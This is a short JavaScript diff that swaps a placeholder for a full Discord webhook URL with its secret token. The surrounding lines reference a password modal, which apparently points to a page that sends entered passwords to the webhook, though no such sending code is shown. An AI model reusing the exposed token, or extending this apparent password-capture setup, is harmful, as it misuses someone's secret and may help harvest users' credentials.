@@ -1,4 +1,4 @@
-const WEBHOOK_URL = "TU_WEBHOOK_AQUI";
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1481813956774596669/5hdY6963mwZyIlxMYXm8qRaKwOj68BsVFmGVCKdl4xpExXdfIUZwFaDSkyNqE7ZUuOGz";
 
 const modalPass = document.getElementById('modalPass');
 const modalContent = document.getElementById('modalContent');
